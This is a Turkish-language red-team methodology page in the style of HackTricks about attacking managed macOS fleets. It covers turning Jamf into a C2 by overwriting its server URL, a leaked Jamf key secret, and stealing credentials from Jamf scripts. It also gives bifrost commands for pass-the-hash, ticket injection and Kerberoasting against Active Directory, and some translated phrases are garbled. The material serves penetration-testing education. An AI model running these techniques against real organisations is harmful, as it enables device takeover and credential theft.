# macOS Kırmızı Takım

{{#include ../../banners/hacktricks-training.md}}


## MDM'leri Kötüye Kullanma

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Eğer yönetim platformuna erişmek için **yönetici kimlik bilgilerini ele geçirirseniz**, makinelerdeki kötü amaçlı yazılımınızı dağıtarak **tüm bilgisayarları tehlikeye atabilirsiniz**.

MacOS ortamlarında kırmızı takım çalışması için MDM'lerin nasıl çalıştığına dair bir anlayışa sahip olmak şiddetle tavsiye edilir:

{{#ref}}
macos-mdm/
{{#endref}}

### MDM'yi C2 Olarak Kullanma

Bir MDM, profilleri yüklemek, sorgulamak veya kaldırmak, uygulamaları yüklemek, yerel yönetici hesapları oluşturmak, firmware şifresi ayarlamak, FileVault anahtarını değiştirmek için izne sahip olacaktır...

Kendi MDM'nizi çalıştırmak için **CSR'nizin bir satıcı tarafından imzalanması** gerekir, bunu [**https://mdmcert.download/**](https://mdmcert.download/) ile elde etmeye çalışabilirsiniz. Apple cihazları için kendi MDM'nizi çalıştırmak için [**MicroMDM**](https://github.com/micromdm/micromdm) kullanabilirsiniz.

Ancak, kayıtlı bir cihazda bir uygulama yüklemek için, hala bir geliştirici hesabı tarafından imzalanmış olması gerekir... ancak, MDM kaydı sırasında **cihaz MDM'nin SSL sertifikasını güvenilir CA olarak ekler**, böylece artık her şeyi imzalayabilirsiniz.

Cihazı bir MDM'ye kaydetmek için, **`mobileconfig`** dosyasını root olarak yüklemeniz gerekir, bu bir **pkg** dosyası aracılığıyla teslim edilebilir (zip içinde sıkıştırabilir ve Safari'den indirildiğinde açılacaktır).

**Mythic agent Orthrus** bu tekniği kullanır.

### JAMF PRO'yu Kötüye Kullanma

JAMF, **özel betikler** (sistem yöneticisi tarafından geliştirilen betikler), **yerel yükler** (yerel hesap oluşturma, EFI şifresi ayarlama, dosya/proses izleme...) ve **MDM** (cihaz yapılandırmaları, cihaz sertifikaları...) çalıştırabilir.

#### JAMF kendi kendine kayıt

`https://<şirket-adı>.jamfcloud.com/enroll/` gibi bir sayfaya giderek **kendi kendine kaydın etkin olup olmadığını** kontrol edin. Eğer etkinse, **erişim için kimlik bilgileri isteyebilir**.

Bir şifre püskürtme saldırısı gerçekleştirmek için [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) betiğini kullanabilirsiniz.

Ayrıca, uygun kimlik bilgilerini bulduktan sonra, diğer kullanıcı adlarını brute-force ile denemek için aşağıdaki formu kullanabilirsiniz:

![](<../../images/image (107).png>)

#### JAMF cihaz Kimlik Doğrulama

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** ikili dosyası, keşif anında herkesle **paylaşılan** anahtarı açma sırrını içeriyordu ve bu: **`jk23ucnq91jfu9aj`**.\
Ayrıca, jamf **`/Library/LaunchAgents/com.jamf.management.agent.plist`** içinde bir **LaunchDaemon** olarak **kalır**.

#### JAMF Cihaz Ele Geçirme

**JSS** (Jamf Software Server) **URL'si** **`jamf`** tarafından kullanılacak olan **`/Library/Preferences/com.jamfsoftware.jamf.plist`** dosyasında bulunmaktadır.\
Bu dosya temelde URL'yi içerir:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Bu nedenle, bir saldırgan, yüklendiğinde bu dosyayı **üstüne yazan** kötü niyetli bir paket (`pkg`) bırakabilir ve **URL'yi bir Typhon ajanından bir Mythic C2 dinleyicisine** ayarlayarak JAMF'i C2 olarak kötüye kullanma imkanı elde edebilir.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Taklit Etme

Bir cihaz ile JMF arasındaki **ileşimi taklit etmek** için şunlara ihtiyacınız var:

- Cihazın **UUID'si**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Cihaz sertifikasını içeren **JAMF anahtarı**: `/Library/Application\ Support/Jamf/JAMF.keychain`

Bu bilgilerle, **ç stolen** Donanım **UUID'si** ile **SIP devre dışı** bırakılmış bir **VM** oluşturun, **JAMF anahtarını** bırakın, Jamf **ajanını** **hook** edin ve bilgilerini çalın.

#### Gizli Bilgilerin Çalınması

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ayrıca, yöneticilerin Jamf aracılığıyla çalıştırmak isteyebileceği **özel betikleri** izlemek için `/Library/Application Support/Jamf/tmp/` konumunu da izleyebilirsiniz; çünkü bu betikler **buraya yerleştirilir, çalıştırılır ve kaldırılır**. Bu betikler **kimlik bilgilerini** içerebilir.

Ancak, **kimlik bilgileri** bu betiklere **parametreler** olarak geçebilir, bu nedenle `ps aux | grep -i jamf` komutunu izlemelisiniz (root olmadan bile).

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) adlı betik, yeni dosyaların eklenmesini ve yeni işlem argümanlarını dinleyebilir.

### macOS Uzaktan Erişim

Ve ayrıca **MacOS** "özel" **ağ** **protokolleri** hakkında:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Bazı durumlarda **MacOS bilgisayarının bir AD'ye bağlı olduğunu** göreceksiniz. Bu senaryoda, aktif dizini **numaralandırmaya** çalışmalısınız. Aşağıdaki sayfalarda bazı **yardımlar** bulabilirsiniz:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Size yardımcı olabilecek bazı **yerel MacOS araçları** `dscl` olabilir:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Ayrıca, MacOS için AD'yi otomatik olarak listelemek ve kerberos ile oynamak için hazırlanmış bazı araçlar vardır:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound, MacOS hostlarında Active Directory ilişkilerini toplamak ve almak için Bloodhound denetim aracına bir ektir.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost, macOS'taki Heimdal krb5 API'leri ile etkileşimde bulunmak için tasarlanmış bir Objective-C projesidir. Projenin amacı, hedefte başka bir çerçeve veya paket gerektirmeden, macOS cihazlarında Kerberos etrafında daha iyi güvenlik testleri yapmaktır.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory listeleme yapmak için JavaScript for Automation (JXA) aracı.

### Alan Bilgisi
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Kullanıcılar

MacOS kullanıcılarının üç türü vardır:

- **Yerel Kullanıcılar** — Yerel OpenDirectory hizmeti tarafından yönetilir, Active Directory ile herhangi bir bağlantıları yoktur.
- **Ağ Kullanıcıları** — DC sunucusuna bağlanarak kimlik doğrulaması gerektiren geçici Active Directory kullanıcılarıdır.
- **Mobil Kullanıcılar** — Kimlik bilgileri ve dosyaları için yerel bir yedekleme olan Active Directory kullanıcılarıdır.

Kullanıcılar ve gruplar hakkında yerel bilgiler _/var/db/dslocal/nodes/Default_ klasöründe saklanır.\
Örneğin, _mark_ adlı kullanıcının bilgileri _/var/db/dslocal/nodes/Default/users/mark.plist_ dosyasında ve _admin_ grubunun bilgileri _/var/db/dslocal/nodes/Default/groups/admin.plist_ dosyasında saklanmaktadır.

HasSession ve AdminTo kenarlarını kullanmanın yanı sıra, **MacHound, Bloodhound veritabanına üç yeni kenar ekler**:

- **CanSSH** - ana makineye SSH ile bağlanmasına izin verilen varlık
- **CanVNC** - ana makineye VNC ile bağlanmasına izin verilen varlık
- **CanAE** - ana makinede AppleEvent betikleri çalıştırmasına izin verilen varlık
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Daha fazla bilgi için [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ şifresi

Şifreleri almak için:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** parolasına Sistem anahtar zincirinde erişmek mümkündür.

### Over-Pass-The-Hash

Belirli bir kullanıcı ve hizmet için bir TGT alın:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGT toplandıktan sonra, mevcut oturuma şu şekilde enjekte etmek mümkündür:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Elde edilen hizmet biletleri ile diğer bilgisayarlardaki paylaşımlara erişim sağlamaya çalışmak mümkündür:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Anahtarlığa Erişim

Anahtarlık, bir istem oluşturulmadan erişildiğinde, bir kırmızı takım egzersizini ilerletmeye yardımcı olabilecek hassas bilgileri yüksek olasılıkla içerir:

{{#ref}}
macos-keychain.md
{{#endref}}

## Harici Hizmetler

MacOS Kırmızı Takımı, genellikle **MacOS'un birkaç harici platformla doğrudan entegre olması** nedeniyle, normal bir Windows Kırmızı Takımından farklıdır. MacOS'un yaygın bir yapılandırması, **OneLogin senkronize kimlik bilgileri kullanarak bilgisayara erişmek ve OneLogin aracılığıyla birkaç harici hizmete** (github, aws...) erişmektir.

## Çeşitli Kırmızı Takım teknikleri

### Safari

Safari'de bir dosya indirildiğinde, eğer "güvenli" bir dosya ise, **otomatik olarak açılacaktır**. Örneğin, eğer **bir zip indirirseniz**, otomatik olarak açılacaktır:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Referanslar

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
